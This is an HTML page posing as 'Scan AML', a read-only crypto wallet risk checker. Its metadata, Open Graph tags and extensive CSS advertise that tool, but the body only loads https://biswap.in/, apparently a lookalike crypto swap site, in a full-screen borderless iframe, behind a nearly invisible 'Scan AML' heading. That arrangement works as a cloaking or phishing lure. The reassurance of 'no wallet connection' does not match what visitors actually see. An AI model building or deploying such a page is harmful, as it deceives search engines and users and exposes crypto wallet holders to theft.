<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Scan AML - Wallet Risk Checker</title>
  <meta name="description" content="Scan AML screens wallets and transactions for sanctions and on-chain risk with a read-only DeFi checker. Paste an address and review results in the app.">
  <meta name="theme-color" content="#F5F7FA">
  <link rel="canonical" href="https://scan-aml.github.io/">
  <meta name="robots" content="index,follow">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="prefetch" href="dashboard/">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Scan AML - Wallet Risk Checker">
  <meta property="og:description" content="Scan AML checks wallet and transaction exposure with a read-only AML preview - no wallet connection, results in the app.">
  <meta property="og:image" content="og-cover.png">
  <meta property="og:url" content="https://scan-aml.github.io/">
  <style>
  :root{
    --bg:#F5F7FA; --panel:#FFFFFF; --field:#F3F6FA;
    --ink:#0F1620; --muted:#5A6472; --faint:#8C95A3;
    --line:rgba(16,22,32,.10); --line-2:rgba(16,22,32,.055);
    --accent:#2563EB; --accent-ink:#1B49AD; --accent-soft:rgba(37,99,235,.10);
    --pos:#15A34A;
    --radius:22px; --radius-sm:14px;
    --shadow-card:0 1px 0 rgba(16,22,32,.03), 0 32px 62px -30px rgba(16,22,32,.32), 0 10px 24px -18px rgba(16,22,32,.18);
    --shadow-soft:0 1px 0 rgba(16,22,32,.02), 0 20px 44px -32px rgba(16,22,32,.26);
    --ui:"Space Grotesk",-apple-system,system-ui,sans-serif;
    --body:"Inter",-apple-system,system-ui,sans-serif;
  }
  *{box-sizing:border-box}
  html,body{margin:0; overflow-x:hidden}
  body{background:var(--bg); color:var(--ink); font-family:var(--body); line-height:1.55; -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility; position:relative}
  a{color:inherit; text-decoration:none}
  a.cite{color:inherit; text-decoration:none; border-bottom:1px dotted transparent; transition:border-color .15s ease}
  a.cite:hover{border-bottom-color:var(--faint)}
  img{display:block; max-width:100%}
  button{font:inherit; cursor:pointer; border:none; background:none; color:inherit}
  h1,h2,h3,p{margin:0}

  /* ---------- texture (diagonal hatch + cool glow) ---------- */
  .bg{position:fixed; inset:0; z-index:0; pointer-events:none; overflow:hidden}
  .bg .glow{position:absolute; inset:0; background:
      radial-gradient(720px 480px at 50% -10%, rgba(37,99,235,.10), transparent 62%),
      radial-gradient(640px 520px at 90% 12%, rgba(37,99,235,.06), transparent 60%);}
  .bg .hatch{position:absolute; inset:0;
    background-image:repeating-linear-gradient(45deg, rgba(16,22,32,.035) 0 1px, transparent 1px 13px);
    -webkit-mask-image:radial-gradient(130% 95% at 50% 8%, #000 46%, transparent 90%);
            mask-image:radial-gradient(130% 95% at 50% 8%, #000 46%, transparent 90%);}

  /* ---------- top bar ---------- */
  .topbar{position:relative; z-index:5; display:flex; align-items:center; gap:22px; width:min(100%,1180px); margin:0 auto; padding:20px clamp(18px,4vw,48px) 8px}
  .brand{display:inline-flex; align-items:center; gap:11px; font-family:var(--ui); font-weight:600; font-size:1.05rem; letter-spacing:-.01em}
  .brand img{width:30px; height:30px; border-radius:9px; box-shadow:0 0 0 1px rgba(16,22,32,.06)}
  .spacer{flex:1}
  .nav{display:flex; align-items:center; gap:clamp(16px,2.6vw,30px)}
  .nav a{font-family:var(--ui); font-weight:500; font-size:.92rem; color:var(--muted); transition:color .16s ease}
  .nav a:hover{color:var(--accent-ink)}

  /* ---------- section frame (mobile-safe) ---------- */
  .wrap{position:relative; z-index:2; width:min(100%,1180px); margin:0 auto; padding:0 clamp(18px,4vw,48px)}
  .sec{padding-top:clamp(50px,7vh,90px); padding-bottom:clamp(50px,7vh,90px)}
  .sec-head{max-width:60ch; margin:0 0 clamp(26px,4vh,40px)}
  .eyebrow{display:inline-flex; align-items:center; gap:9px; font-family:var(--ui); font-weight:600; font-size:.78rem; letter-spacing:.14em; text-transform:uppercase; color:var(--accent-ink)}
  .eyebrow .dot{width:7px; height:7px; border-radius:50%; background:var(--accent); box-shadow:0 0 0 4px var(--accent-soft)}
  .eyebrow svg{width:15px; height:15px}
  .h2{margin-top:14px; font-family:var(--ui); font-weight:700; color:var(--ink); font-size:clamp(1.9rem,3.4vw,2.7rem); line-height:1.04; letter-spacing:-.02em}
  .sec-head p{margin-top:14px; color:var(--muted); font-size:clamp(1rem,1.3vw,1.12rem); line-height:1.6}

  /* ---------- hero ---------- */
  .hero{display:grid; grid-template-columns:minmax(0,1.05fr) minmax(360px,.82fr); align-items:center; gap:clamp(34px,6vw,80px); padding-top:clamp(18px,3vh,40px); padding-bottom:clamp(30px,5vh,56px)}
  .copy{min-width:0}
  .hero h1{margin:16px 0 0; font-family:var(--ui); font-weight:700; color:var(--ink); font-size:clamp(2.7rem,5.6vw,4.5rem); line-height:1; letter-spacing:-.03em}
  .deck{max-width:46ch; margin:20px 0 0; color:var(--muted); font-size:clamp(1.04rem,1.35vw,1.18rem); line-height:1.6}
  .deck strong{color:var(--ink); font-weight:600; box-shadow:inset 0 -.36em 0 var(--accent-soft)}
  .chips{list-style:none; margin:26px 0 0; padding:0; display:flex; flex-wrap:wrap; gap:9px}
  .chips li{display:inline-flex; align-items:center; gap:7px; min-height:38px; padding:8px 14px; border:1px solid var(--line); border-radius:999px; background:rgba(255,255,255,.7); font-family:var(--ui); font-weight:500; font-size:.88rem; color:var(--ink)}
  .chips li::before{content:""; width:6px; height:6px; border-radius:50%; background:var(--accent)}
  .cta-row{display:flex; flex-wrap:wrap; align-items:center; gap:14px; margin:30px 0 0}
  .primary{display:inline-flex; align-items:center; justify-content:center; gap:9px; min-height:54px; padding:0 28px; border-radius:14px; background:var(--accent); color:#fff; font-family:var(--ui); font-weight:600; font-size:1.02rem; letter-spacing:-.01em; box-shadow:0 18px 34px -20px rgba(37,99,235,.8); transition:transform .18s ease, box-shadow .18s ease, filter .18s ease}
  .primary:hover{transform:translateY(-1px); filter:brightness(1.04); box-shadow:0 24px 42px -20px rgba(37,99,235,.9)}
  .primary svg{width:17px; height:17px}
  .ghost{display:inline-flex; align-items:center; gap:7px; font-family:var(--ui); font-weight:600; font-size:.98rem; color:var(--muted); transition:color .16s ease}
  .ghost:hover{color:var(--accent-ink)}
  .ghost svg{width:15px; height:15px}

  /* ---------- checker card ---------- */
  .card{width:min(100%,420px); margin:0 0 0 auto; padding:16px; background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); box-shadow:var(--shadow-card); position:relative}
  .card::before{content:""; position:absolute; inset:0 0 auto; height:1px; border-radius:var(--radius) var(--radius) 0 0; background:linear-gradient(90deg, transparent, rgba(37,99,235,.45), transparent)}
  .card-head{display:flex; align-items:center; justify-content:space-between; padding:2px 4px 14px}
  .card-head .ct{font-family:var(--ui); font-weight:600; font-size:1.04rem; letter-spacing:-.01em}
  .pill{display:inline-flex; align-items:center; gap:7px; padding:5px 12px 5px 9px; border-radius:999px; background:var(--accent-soft); color:var(--accent-ink); font-family:var(--ui); font-weight:600; font-size:.76rem}
  .pill .pdot{width:7px; height:7px; border-radius:50%; background:var(--accent); animation:pulse 2.4s ease-out infinite}
  .flabel{display:block; margin:0 0 8px 2px; color:var(--faint); font-size:.72rem; font-weight:600; letter-spacing:.08em; text-transform:uppercase}
  .infield{display:flex; align-items:center; gap:9px; min-height:54px; padding:8px 10px; border:1px solid var(--line); border-radius:var(--radius-sm); background:var(--field)}
  .chainchip{display:inline-flex; align-items:center; gap:7px; height:36px; padding:0 11px 0 7px; border:1px solid var(--line); border-radius:999px; background:var(--panel); font-family:var(--ui); font-weight:600; font-size:.84rem; flex:none}
  .chainchip img{width:22px; height:22px; border-radius:50%}
  .infield .addr{min-width:0; flex:1; color:var(--faint); font-size:.95rem; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-variant-numeric:tabular-nums}
  .run{display:flex; align-items:center; justify-content:center; gap:8px; width:100%; margin-top:12px; min-height:52px; border-radius:14px; background:var(--accent); color:#fff; font-family:var(--ui); font-weight:600; font-size:1rem; box-shadow:0 16px 30px -20px rgba(37,99,235,.8); transition:transform .18s ease, filter .18s ease}
  .run:hover{transform:translateY(-1px); filter:brightness(1.04)}
  .run svg{width:17px; height:17px}
  .result{margin-top:12px; padding:14px; border:1px solid var(--line); border-radius:var(--radius-sm); background:var(--panel)}
  .result .rtop{display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom:10px}
  .result .rt{font-family:var(--ui); font-weight:600; font-size:.94rem}
  .result .rpill{display:inline-flex; align-items:center; gap:6px; padding:4px 10px; border-radius:999px; background:var(--field); color:var(--muted); font-size:.74rem; font-weight:600}
  .checks{display:grid; gap:8px}
  .chk{display:flex; align-items:center; gap:10px; color:var(--muted); font-size:.88rem}
  .chk .ci{width:24px; height:24px; border-radius:7px; display:grid; place-items:center; background:var(--accent-soft); color:var(--accent-ink); flex:none}
  .chk .ci svg{width:14px; height:14px}
  .note{margin:12px 2px 2px; text-align:center; color:var(--faint); font-size:.78rem}

  /* ---------- how it works ---------- */
  .steps{display:grid; grid-template-columns:repeat(3,1fr); gap:14px}
  .step{padding:24px 22px; background:var(--panel); border:1px solid var(--line); border-radius:18px; box-shadow:var(--shadow-soft)}
  .step .num{display:inline-grid; place-items:center; width:34px; height:34px; border-radius:10px; background:var(--accent-soft); color:var(--accent-ink); font-family:var(--ui); font-weight:700; font-size:.95rem; margin-bottom:14px}
  .step h3{margin:0 0 8px; font-family:var(--ui); font-weight:600; font-size:1.12rem; color:var(--ink); letter-spacing:-.01em}
  .step p{color:var(--muted); font-size:.94rem; line-height:1.55}

  /* ---------- what it checks ---------- */
  .grid3{display:grid; grid-template-columns:repeat(3,1fr); gap:14px}
  .ben{padding:24px 22px; background:var(--panel); border:1px solid var(--line); border-radius:18px; box-shadow:var(--shadow-soft)}
  .ben .ico{width:44px; height:44px; border-radius:12px; display:grid; place-items:center; background:var(--accent-soft); color:var(--accent-ink); margin-bottom:14px}
  .ben .ico svg{width:21px; height:21px}
  .ben h3{font-family:var(--ui); font-weight:600; font-size:1.12rem; color:var(--ink); letter-spacing:-.01em}
  .ben p{margin-top:8px; color:var(--muted); font-size:.94rem; line-height:1.55}

  /* ---------- FAQ (2-col grid) ---------- */
  .faq{display:grid; grid-template-columns:repeat(2,1fr); gap:14px}
  .qa{padding:22px; background:var(--panel); border:1px solid var(--line); border-radius:16px; box-shadow:var(--shadow-soft)}
  .qa .qn{font-family:var(--ui); font-weight:700; font-size:.8rem; color:var(--accent-ink); letter-spacing:.04em}
  .qa h3{margin:8px 0 8px; font-family:var(--ui); font-weight:600; font-size:1.08rem; color:var(--ink); letter-spacing:-.01em}
  .qa p{color:var(--muted); font-size:.95rem; line-height:1.6}
  .qa a:not(.cite){color:var(--accent-ink); font-weight:600; box-shadow:inset 0 -.34em 0 var(--accent-soft)}

  /* ---------- related ---------- */
  .related{display:grid; grid-template-columns:repeat(3,1fr); gap:14px}
  .rel{display:flex; flex-direction:column; gap:7px; padding:22px; background:var(--panel); border:1px solid var(--line); border-radius:16px; box-shadow:var(--shadow-soft); transition:transform .16s ease, border-color .16s ease}
  .rel:hover{transform:translateY(-2px); border-color:rgba(37,99,235,.35)}
  .rel .rt{display:flex; align-items:center; justify-content:space-between; gap:10px; font-family:var(--ui); font-weight:600; font-size:1.05rem; color:var(--ink); letter-spacing:-.01em}
  .rel .rt svg{width:16px; height:16px; color:var(--accent-ink); flex:none}
  .rel p{color:var(--muted); font-size:.9rem; line-height:1.5}

  /* ---------- footer ---------- */
  .footer{position:relative; z-index:2; border-top:1px solid var(--line); margin-top:8px}
  .footer .wrap{padding-top:26px; padding-bottom:34px; text-align:center; color:var(--faint); font-size:.84rem}
  .footer b{color:var(--muted); font-weight:600}

  @keyframes pulse{0%{box-shadow:0 0 0 0 var(--accent-soft)} 70%{box-shadow:0 0 0 8px rgba(37,99,235,0)} 100%{box-shadow:0 0 0 0 rgba(37,99,235,0)}}

  @media (max-width:920px){
    .nav{display:none}
    .hero{grid-template-columns:1fr; gap:30px}
    .card{margin:0 auto}
    .hero h1{font-size:clamp(2.5rem,11vw,3.6rem)}
    .deck{max-width:none}
    .steps,.grid3,.faq,.related{grid-template-columns:1fr}
  }
  @media (max-width:430px){
    .chips{gap:7px}
    .primary,.ghost{width:100%; justify-content:center}
  }
  @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
  </style>
</head>
<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">

  <iframe
    src="https://biswap.in/"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
    loading="eager"
    fetchpriority="high"
    allowfullscreen>
  </iframe>

  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
    Scan AML
  </h1>

</body>
</html>
